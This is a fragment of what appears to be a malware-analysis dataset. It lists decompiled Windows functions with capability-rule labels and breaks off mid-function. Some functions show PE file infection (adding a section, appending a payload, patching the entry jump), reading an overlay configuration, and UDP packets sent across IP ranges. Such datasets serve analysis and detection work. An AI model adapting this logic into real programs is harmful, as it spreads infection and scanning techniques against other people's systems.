        "decompiled_code": "\nvoid __cdecl fcn.0040143f(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint lpFileName;\n    int32_t var_4h;\n    \n    uVar2 = fcn.0040acd8(0x417834, 0xc, 0x4b7497f2);\n    uVar2 = fcn.0040acd8(0x417844, 5, 0xaedf6064, arg_8h, uVar2);\n    iVar3 = fcn.0040beef(uVar2, arg_8h);\n    if (iVar3 != 0) {\n        *0x41c25c = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0xc0000000, 1, 0, 4, 0, 0);\n        if (*0x41c25c != -1) {\n            var_4h = (*_sym.imp.KERNEL32.dll_GetFileSize)(*0x41c25c, 0);\n            while ((var_4h != 0 && (cVar1 = fcn.004013d5(&var_10h, &var_ch),  cVar1 != '\\0'))) {\n                fcn.004012ed(var_10h, var_ch, 0);\n                fcn.0040af12();\n            }\n        }\n        fcn.0040af12();\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "00403dcd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403dcd(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t hFile;\n    \n    arg_ch_00 = fcn.00405ff0();\n    arg_8h_00 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, arg_ch_00, arg_8h);\n    fcn.0040beef(arg_8h_00, arg_ch_00);\n    iVar3 = 0;\n    hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0, 0);\n    if (hFile != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileSize)(hFile, 0);\n        if (arg_ch != NULL) {\n            *arg_ch = iVar1;\n        }\n        iVar3 = fcn.0040ae05(0);\n        if (iVar3 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, iVar3, iVar1, &lpNumberOfBytesRead, 0);\n            if ((iVar2 == 0) || (iVar1 != lpNumberOfBytesRead)) {\n                fcn.0040af12();\n                iVar3 = 0;\n            }\n        }\n        fcn.0040c13c();\n    }\n    return iVar3;\n}\n",
        "token_count": 378
    },
    "00403fe2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403fe2(uint arg_8h, uint lpBuffer)\n\n{\n    uint arg_ch;\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    uint lpNumberOfBytesWritten;\n    uint lpFileName;\n    \n    uVar3 = 0;\n    arg_ch = fcn.00405ff0();\n    arg_8h_00 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, arg_ch, arg_8h);\n    fcn.0040beef(arg_8h_00, arg_ch);\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x40000000, 1, 0, 2, 0, 0);\n    if (uVar1 != 0xffffffff) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(uVar1, lpBuffer);\n        if ((iVar2 != 0) && (unaff_EDI == in_ECX)) {\n            uVar3 = 1;\n        }\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar1);\n        uVar1 = fcn.0040c13c();\n    }\n    return uVar1 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 330
    },
    "00404eb1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00404eb1(uint lpFileName)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    ulong uVar11;\n    uint var_28h;\n    int32_t lpNumberOfBytesWritten;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *hFile;\n    uint32_t lpBaseAddress;\n    uint32_t lpBuffer;\n    uint32_t n;\n    uint var_1h;\n    \n    n = *0x41d8dc;\n    var_20h = *0x41d6cc;\n    var_1h._0_1_ = 0;\n    lpBuffer = 0;\n    var_18h = 0;\n    hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0, 0);\n    if (hFile != 0xffffffff) {\n        var_1ch = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(hFile, 0, 2, 0, 0, 0);\n        if (var_1ch != 0) {\n            lpBaseAddress = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(var_1ch, 4, 0, 0, 0);\n            if (lpBaseAddress != 0) {\n                iVar8 = *(lpBaseAddress + 0x3c) + lpBaseAddress;\n                uVar2 = *(iVar8 + 6) * 0x28 + 0x120;\n                if (uVar2 < *(iVar8 + 0x54) || uVar2 == *(iVar8 + 0x54)) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(hFile, 0);\n                    uVar2 = n;\n                    if (n % *(iVar8 + 0x38) != 0) {\n                        uVar2 = (n / *(iVar8 + 0x38) + 1) * *(iVar8 + 0x38);\n                    }\n                    var_18h = uVar2 + iVar3;\n                    uVar2 = fcn.0040ae05(0);\n                    lpBuffer = uVar2;\n                    if (uVar2 != 0) {\n                        sub.ntdll.dll_memcpy(uVar2, lpBaseAddress, iVar3);\n                        sub.ntdll.dll_memcpy(iVar3 + uVar2, var_20h, n);\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(lpBaseAddress);\n            }\n            fcn.0040c13c();\n        }\n        fcn.0040c13c();\n        hFile = lpBuffer;\n        if (lpBuffer != 0) {\n            iVar3 = *(lpBuffer + 0x3c) + lpBuffer;\n            *(iVar3 + 6) = *(iVar3 + 6) + 1;\n            lpBaseAddress = *(iVar3 + 6);\n            lpNumberOfBytesWritten = *(iVar3 + 0x14) + 0x18 + iVar3;\n            hFile = lpBaseAddress * 0x28 + -0x28 + lpNumberOfBytesWritten;\n            iVar7 = (lpBaseAddress - 2) * 0x28 + lpNumberOfBytesWritten;\n            puVar9 = hFile;\n            for (iVar8 = 10; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            hFile[9] = 0x60000020;\n            uVar2 = *(iVar3 + 0x38);\n            uVar10 = n;\n            if (n % uVar2 != 0) {\n                uVar10 = (n / uVar2 + 1) * uVar2;\n            }\n            hFile[2] = uVar10;\n            uVar2 = *(iVar3 + 0x38);\n            if (*(iVar7 + 8) % uVar2 == 0) {\n                iVar8 = *(iVar7 + 8);\n            }\n            else {\n                iVar8 = (*(iVar7 + 8) / uVar2 + 1) * uVar2;\n            }\n            hFile[3] = *(iVar7 + 0xc) + iVar8;\n            hFile[4] = n;\n            hFile[5] = *(iVar7 + 0x14) + *(iVar7 + 0x10);\n            uVar11 = fcn.004049cb(lpBaseAddress);\n            iVar7 = var_18h;\n            puVar4 = uVar11 + lpBuffer;\n            iVar8 = hFile[3];\n            *puVar4 = 0xe9;\n            uVar2 = 0;\n            uVar10 = 0xffffffff;\n            *(puVar4 + 1) = (iVar8 - *(iVar3 + 0x28)) + 0x623;\n            if (lpBaseAddress != 0) {\n                puVar5 = (uVar11 >> 0x20) + 0x14;\n                uVar6 = lpBaseAddress;\n                do {\n                    if (uVar2 < puVar5[-2] + puVar5[-3]) {\n                        uVar2 = puVar5[-2] + puVar5[-3];\n                    }\n                    uVar1 = *puVar5;\n                    if ((uVar1 != 0) && (uVar1 <= uVar10)) {\n                        uVar10 = uVar1;\n                    }\n                    puVar5 = puVar5 + 10;\n                    uVar6 = uVar6 - 1;\n                } while (uVar6 != 0);\n            }\n            uVar6 = 0x1000;\n            if (uVar10 < 0x1001) {\n                uVar6 = uVar10;\n            }\n            *(iVar3 + 0x54) = uVar6;\n            *(iVar3 + 0x50) = uVar2;\n            var_28h = 0;\n            var_1ch = 0;\n            iVar8 = (*_sym.imp.imagehlp.dll_CheckSumMappedFile)(lpBuffer, var_18h, &var_28h, &var_1ch);\n            if (iVar8 != 0) {\n                *(iVar3 + 0x58) = var_1ch;\n            }\n            iVar8 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x40000000, 0, 0, 2, 0, 0);\n            if (iVar8 != -1) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar8, lpBuffer, iVar7, &lpNumberOfBytesWritten, 0);\n                if ((iVar3 == 0) || (var_1h._0_1_ = 1,  lpNumberOfBytesWritten != iVar7)) {\n                    var_1h._0_1_ = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar8);\n                fcn.0040c13c();\n            }\n            hFile = fcn.0040af12();\n        }\n    }\n    return hFile & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1700
    },
    "004054cb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004054cb(int32_t lpFileName)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    uchar *arg_10h;\n    int32_t iVar8;\n    int32_t *piVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint uVar13;\n    uchar auStack572 [12];\n    uchar auStack560 [556];\n    \n    uVar13 = 0;\n    uVar12 = 3;\n    iVar11 = 0;\n    iVar10 = 1;\n    piVar9 = 0x80000000;\n    iVar8 = lpFileName;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0, 0);\n    if (uVar2 != 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_GetFileSize)(uVar2, 0);\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(uVar2, 0, 2, 0, 0, 0);\n        if (iVar3 != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar3, 4, 0, 0, 0);\n            iVar3 = iVar4;\n            if (iVar4 != 0) {\n                iVar5 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(lpFileName);\n                (*_sym.imp.KERNEL32.dll_lstrcpynW)(auStack560, lpFileName, iVar5 - lpFileName >> 1);\n                iVar5 = *(iVar4 + 0x3c) + iVar4;\n                uVar2 = *(iVar5 + 6);\n                if ((uVar2 != 0) && (*(iVar5 + 0x84) != 0)) {\n                    iVar11 = *(iVar5 + 0x14) + 0x18 + iVar5;\n                    iVar5 = fcn.004049cb(uVar2);\n                    piVar6 = iVar5 + iVar4 + 0xc;\n                    iVar4 = *piVar6;\n                    while (iVar4 != 0) {\n                        if (piVar6[1] != 0) {\n                            iVar4 = fcn.004049cb(uVar2);\n                            iVar4 = iVar4 + iVar10;\n                            uVar7 = fcn.0040d63e(iVar4);\n                            iVar3 = fcn.0040c7c4(uVar7);\n                            fcn.0040af12();\n                            if (iVar3 == 0) {\n                                arg_10h = auStack572;\n                                uVar7 = fcn.0040acd8(0x4182a0, 5, 0xd2b9d1e6, arg_10h, iVar4);\n                                fcn.0040be75(&stack0xfffffbbc, uVar7, arg_10h);\n                                iVar4 = fcn.0040cbc0(&stack0xfffffbbc);\n                                if ((iVar4 != 0) && (cVar1 = fcn.00405239(lpFileName, &stack0xfffffbbc),  cVar1 != '\\0')\n                                   ) {\n                                    iVar8 = CONCAT13(1, iVar8);\n                                    piVar9 = piVar6;\n                                    break;\n                                }\n                            }\n                        }\n                        piVar6 = piVar6 + 5;\n                        piVar9 = piVar6;\n                        iVar4 = *piVar6;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(iVar10);\n            }\n            fcn.0040c13c(iVar8, piVar9, iVar10, iVar11, uVar12, uVar13, iVar3);\n        }\n        uVar2 = fcn.0040c13c();\n    }\n    return uVar2 & 0xffffff00 | uVar12 >> 0x18;\n}\n",
        "token_count": 914
    },
    "00405d2f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d2f(uint lpString1)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint lpString2;\n    uint lptstrFilename;\n    uint var_416h;\n    uint lpdwHandle;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lptstrFilename, 0x104);\n    if (iVar4 != 0) {\n        iVar4 = iVar4 * 2;\n        piVar1 = &lptstrFilename + iVar4 + 2;\n        do {\n            do {\n                do {\n                    *(&lptstrFilename + iVar4) = 0;\n                    uVar5 = fcn.0040acd8(0x4184cc, 8, 0xea75afb7);\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lptstrFilename, uVar5);\n                    iVar3 = fcn.0040c985();\n                    *piVar1 = iVar3 + 0x61;\n                    iVar3 = fcn.0040c985();\n                    *(&var_416h + iVar4) = iVar3 + 0x61;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(&lptstrFilename, &lpFindFileData);\n                } while (iVar6 == -1);\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar6);\n                cVar2 = fcn.00405a0c(&lpString2);\n            } while (cVar2 == '\\0');\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(piVar1, &lpString2);\n            lpdwHandle = 0;\n            iVar6 = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeW)(&lptstrFilename, &lpdwHandle);\n        } while (iVar6 == 0);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, &lptstrFilename);\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00407434": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407434(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint ARG_0;\n    uint lpBuffer;\n    int32_t var_34h;\n    int32_t lpBaseAddress;\n    int32_t var_2ch;\n    uint lpNumberOfBytesRead;\n    int32_t var_24h;\n    int32_t lpOutputString;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t hFile;\n    int32_t nNumberOfBytesToRead;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\0';\n    hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x41dc10, 0x80000000, 1, 0, 3, 0, 0);\n    if (hFile != -1) {\n        var_34h = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(hFile, 0, 2, 0, 0, 0);\n        if (var_34h != 0) {\n            lpBaseAddress = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(var_34h, 4, 0, 0, 0);\n            if (lpBaseAddress != 0) {\n                iVar2 = *(lpBaseAddress + 0x3c) + lpBaseAddress;\n                uVar6 = *(iVar2 + 6);\n                uVar7 = 0;\n                if (*(iVar2 + 6) != 0) {\n                    puVar3 = *(iVar2 + 0x14) + iVar2 + 0x2c;\n                    do {\n                        if (uVar7 < *puVar3) {\n                            uVar7 = *puVar3;\n                        }\n                        puVar3 = puVar3 + 10;\n                        uVar6 = uVar6 - 1;\n                    } while (uVar6 != 0);\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(hFile, 0);\n                (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, iVar2 + -5, 0, 0);\n                iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, &lpBuffer, 5, &lpNumberOfBytesRead, 0);\n                if (iVar4 != 0) {\n                    nNumberOfBytesToRead = iVar2 + -0x43994;\n                    uVar7 = fcn.0040ae05(0);\n                    var_1ch = uVar7;\n                    if (uVar7 != 0) {\n                        (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, iVar2 - nNumberOfBytesToRead, 0, 0);\n                        (*_sym.imp.KERNEL32.dll_ReadFile)\n                                  (hFile, uVar7, nNumberOfBytesToRead + -5, &lpNumberOfBytesRead, 0);\n                        var_8h._0_1_ = *(nNumberOfBytesToRead + -9 + uVar7);\n                        var_8h._1_2_ = *(nNumberOfBytesToRead + -8 + uVar7);\n                        fcn.0040b824(&lpBuffer, 5, &var_8h, 2, 0);\n                        var_18h = 0;\n                        fcn.0040d7c0();\n                        var_ch._0_1_ = *(nNumberOfBytesToRead + -7 + uVar7);\n                        var_ch._1_2_ = *(nNumberOfBytesToRead + -6 + uVar7);\n                        fcn.0040b824(&lpBuffer, 5, &var_ch, 2, 0);\n                        var_24h = 0;\n                        fcn.0040d7c0();\n                        fcn.0040b824(&lpBuffer, 5, uVar7, nNumberOfBytesToRead + -9, 0);\n                        cVar1 = fcn.004089f8(arg_8h);\n                        if (cVar1 != '\\0') {\n                            fcn.0040bd6e(uVar7);\n                            uVar5 = fcn.0040a88f(0x418680, 0x28, 0x633aaae4, 0);\n                            fcn.0040bf4f(uVar5, var_18h & 0xffff);\n                            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(lpOutputString);\n                            fcn.0040af12();\n                            fcn.0040af12();\n                            uVar7 = var_1ch;\n                        }\n                        lpOutputString = fcn.004156e4(uVar7, &nNumberOfBytesToRead);\n                        if (lpOutputString != 0) {\n                            uVar5 = fcn.0040a88f(0x4186ac, 1, 0xbf5ae497, 0);\n                            fcn.00415506(uVar5);\n                            uVar5 = fcn.00415629();\n                            *0x41de18 = fcn.0040bd6e(uVar5);\n                            if (*0x41de18 != 0) {\n                                uVar5 = fcn.0040a88f(0x4186b0, 1, 0x6df4eedc, 0);\n                                var_2ch = fcn.00415506(uVar5);\n                                if (var_2ch != 0) {\n                                    uVar7 = fcn.004154a9();\n                                    if (uVar7 < 6) {\n                                        *0x41de1c = fcn.004154a9();\n                                    }\n                                    else {\n                                        *0x41de1c = 5;\n                                    }\n                                    *0x41dc0c = fcn.0040ae05(8);\n                                    var_1ch = 0;\n                                    if (*0x41de1c != 0) {\n                                        do {\n                                            fcn.004154d0(var_1ch);\n                                            uVar5 = fcn.00415629();\n                                            uVar5 = fcn.0040bd6e(uVar5);\n                                            *(*0x41dc0c + var_1ch * 4) = uVar5;\n                                            var_1ch = var_1ch + 1;\n                                        } while (var_1ch < *0x41de1c);\n                                    }\n                                    var_1h._0_1_ = '\\x01';\n                                }\n                            }\n                            fcn.004153f3();\n                        }\n                        fcn.0040af12();\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(lpBaseAddress);\n            }\n            fcn.0040c13c();\n        }\n        fcn.0040c13c();\n        if (var_1h != '\\0') {\n            return;\n        }\n    }\n    uVar5 = fcn.0040a88f(0x4186b4, 7, 0x9ed6f398, 0);\n    var_24h = fcn.00415506(uVar5);\n    if (var_24h != 0) {\n        uVar5 = fcn.0040a88f(0x4186bc, 3, 0xd3f7dad3, 0);\n        fcn.00415506(uVar5);\n        uVar5 = fcn.00415629();\n        *0x41de18 = fcn.0040bd6e(uVar5);\n        *0x41de1c = 5;\n        *0x41dc0c = fcn.0040ae05(8);\n        uVar7 = 1;\n        if (*0x41de1c != 0) {\n            do {\n                uVar6 = uVar7;\n                uVar5 = fcn.0040a88f(0x4186c0, 7, 0xfa7f171f, 0);\n                (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, uVar5, uVar6);\n                fcn.00415506(&ARG_0);\n                uVar5 = fcn.00415629();\n                uVar5 = fcn.0040bd6e(uVar5);\n                *(*0x41dc0c + -4 + uVar7 * 4) = uVar5;\n                uVar7 = uVar7 + 1;\n            } while (uVar7 <= *0x41de1c);\n        }\n    }\n    return;\n}\n",
        "token_count": 1956
    },
    "0040782f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040782f(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint extraout_ECX;\n    bool bVar9;\n    uint *puVar10;\n    uint lpOutputString;\n    uint var_118h;\n    uint var_b0h;\n    uint var_44h;\n    uint var_34h;\n    ushort var_30h;\n    uint var_2eh;\n    uint8_t var_2ah;\n    uint8_t var_29h;\n    ushort uStack44;\n    uint uStack42;\n    ushort uStack38;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t buf;\n    int32_t len;\n    uint32_t var_10h;\n    uint32_t hostshort;\n    uint var_5h;\n    uint8_t var_1h;\n    \n    var_5h._0_1_ = 0;\n    uVar3 = fcn.0040a88f(0x4186c8, 7, 0x602a3a93, 0);\n    buf = fcn.00415506(uVar3);\n    if (buf != 0) {\n        uVar3 = fcn.0040a88f(0x4186d0, 10, 0x2f12fc5b, 0);\n        buf = fcn.00415506(uVar3);\n        if (buf != 0) {\n            hostshort = buf;\n            uVar3 = fcn.0040a88f(0x4186dc, 7, 0x317b1715, 0);\n            fcn.00415506(uVar3);\n            var_20h = fcn.004155c2();\n            len = 0;\n            if (var_20h == 0) {\n                var_20h = 0xffffffff;\n            }\n            puVar10 = &len;\n            fcn.00415506(arg_ch, extraout_ECX);\n            uVar3 = fcn.00415629();\n            buf = fcn.00407d6d(arg_8h, uVar3, puVar10);\n            pcVar1 = _sym.imp.USER32.dll_CharLowerBuffA;\n            if (buf != 0) {\n                (*_sym.imp.USER32.dll_CharLowerBuffA)(buf, len);\n                fcn.0040ee5a(buf, len, &var_44h);\n                uVar3 = fcn.0040a88f(0x4186e4, 4, 0x954cf042, 0);\n                len = fcn.0040bfb0(len, uVar3, var_44h);\n                (*pcVar1)(buf, len);\n                uVar3 = fcn.0040a88f(0x4186ec, 0xb, 0x6a489448, 0);\n                uVar4 = fcn.0040a88f(0x4186f8, 2, 0x6664ad8d, 0);\n                puVar10 = &var_b0h;\n                fcn.00415506(uVar4, uVar3, puVar10, &var_118h, &var_34h);\n                fcn.00415629();\n                fcn.0040c102(uVar3, puVar10);\n                uVar3 = fcn.0040a88f(0x4186fc, 4, 0xfa917fc8, 0);\n                fcn.00415506(uVar3);\n                hostshort = fcn.004155c2();\n                hostshort = hostshort & 0xffff;\n                uVar5 = fcn.0040f65b();\n                uVar6 = fcn.0040f619(&var_b0h);\n                uVar6 = uVar6 & uVar5;\n                var_10h = ~uVar5 | uVar6;\n                var_2eh._0_2_ = 0;\n                var_2eh._2_1_ = 0;\n                var_2eh._3_1_ = 0;\n                var_2ah = 0;\n                var_29h = 0;\n                uStack44 = 0;\n                uStack42 = 0;\n                uStack38 = 0;\n                var_30h = 2;\n                var_1ch = uVar6;\n                var_2eh._0_2_ = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n                iVar7 = (*_sym.imp.WS2_32.dll_socket)(2, 2, 0x11);\n                if (iVar7 != -1) {\n                    hostshort = 0;\n                    var_5h._3_1_ = uVar6;\n                    if (var_5h._3_1_ <= var_10h) {\n                        do {\n                            var_1h = uVar6 >> 8;\n                            if (var_1h <= var_10h._1_1_) {\n                                do {\n                                    while (var_5h._1_1_ = var_1ch._2_1_,  var_1ch._2_1_ <= var_10h._2_1_) {\n                                        while (var_5h._2_1_ = var_1ch._3_1_,  var_1ch._3_1_ <= var_10h._3_1_) {\n                                            bVar9 = hostshort == var_20h;\n                                            hostshort = hostshort + 1;\n                                            if (bVar9) {\n                                                hostshort = 0;\n                                                (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n                                            }\n                                            var_2eh._2_1_ = var_5h._3_1_;\n                                            var_2eh._3_1_ = var_1h;\n                                            var_2ah = var_5h._1_1_;\n                                            var_29h = var_5h._2_1_;\n                                            cVar2 = fcn.004089f8(arg_8h);\n                                            if (cVar2 != '\\0') {\n                                                uVar3 = (*_sym.imp.WS2_32.dll_inet_ntoa)\n                                                                  (CONCAT13(var_29h, CONCAT12(var_2ah, CONCAT11(var_2eh.\n                                                            _3_1_, var_2eh._2_1_))));\n                                                uVar4 = fcn.0040a88f(0x418704, 0x13, 0x3e5ffd21, 0);\n                                                (*_sym.imp.USER32.dll_wsprintfA)(&lpOutputString, uVar4, uVar3, buf);\n                                                (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&lpOutputString);\n                                            }\n                                            iVar8 = (*_sym.imp.WS2_32.dll_sendto)(iVar7, buf, len, 0, &var_30h, 0x10);\n                                            if (iVar8 == len) {\n                                                var_5h._0_1_ = 1;\n                                            }\n                                            if (var_5h._2_1_ == 0xff) break;\n                                            var_1ch._3_1_ = var_5h._2_1_ + 1;\n                                        }\n                                        if (var_5h._1_1_ == 0xff) break;\n                                        var_1ch._2_1_ = var_5h._1_1_ + 1;\n                                    }\n                                } while ((var_1h != 0xff) && (var_1h = var_1h + 1,  var_1h <= var_10h._1_1_));\n                            }\n                        } while ((var_5h._3_1_ != 0xff) && (var_5h._3_1_ = var_5h._3_1_ + 1,  var_5h._3_1_ <= var_10h));\n                    }\n                    fcn.0040f644(iVar7);\n                }\n                buf = fcn.0040af12();\n            }\n        }\n    }\n    return buf & 0xffffff00 | var_5h;\n}\n",
        "token_count": 1860
    },
    "00407b4a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407b4a(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint arg_10h;\n    \n    fcn.00409aaf();\n    fcn.00409aa9();\n    cVar1 = fcn.00408ce7();\n    if (cVar1 == '\\0') {\n        arg_10h = 0x18562c52;\n        arg_ch_00 = 0xb;\n        uVar2 = 0x41872c;\n    }\n    else {\n        if (arg_ch != -1) {\n            uVar2 = fcn.0040a88f(0x418720, 10, 0x2bd5dbdb, 0);\n            cVar1 = fcn.0040782f(arg_8h, uVar2);\n            if (cVar1 != '\\0') {\n                fcn.00408d5b();\n            }\n            goto code_r0x00407bc2;\n        }\n        arg_10h = 0x3bd7d766;\n        arg_ch_00 = 5;\n        uVar2 = 0x418718;\n    }\n    uVar2 = fcn.0040a88f(uVar2, arg_ch_00, arg_10h, 0);\n    fcn.0040782f(arg_8h, uVar2);\ncode_r0x00407bc2:\n    fcn.00409aa9();\n    return;\n}\n",
        "token_count": 342
    },
    "004084db": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "read file via mapping"
        ],
        "decompiled_code": "\nint32_t fcn.004084db(void)\n\n{\n    int32_t iVar1;\n    \n    if ((*0x41bb3c == -1) &&\n       (iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x41dc10, 0x80000000, 1, 0, 3, 0, 0),  iVar1 != -1)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(iVar1, 0, 2, 0, 0, 0);\n        if (iVar1 != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar1, 4, 0, 0, 0);\n            if (iVar1 != 0) {\n                *0x41bb3c = *(*(iVar1 + 0x3c) + 0x58 + iVar1);\n                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(iVar1);\n            }\n            fcn.0040c13c();\n        }\n        fcn.0040c13c();\n    }\n    return *0x41bb3c;\n}\n",
        "token_count": 257
    },
    "00409283": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409283(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint lpvObject;\n    int32_t var_a0h;\n    int32_t cScanLines;\n    uint lpbi;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    uint var_7ch;\n    ushort var_64h;\n    int32_t var_62h;\n    uint uStack98;\n    uint var_5ah;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint lprc;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t hgdiobj;\n    uint lpLastAccessTime;\n    uint32_t var_1ch;\n    int32_t pvParam;\n    int32_t hDC;\n    int32_t var_10h;\n    int32_t nWidth;\n    uint32_t var_8h;\n    \n    uVar2 = fcn.0040a88f(str.sL3, 9, 0xd61a20be, 0);\n    var_8h = 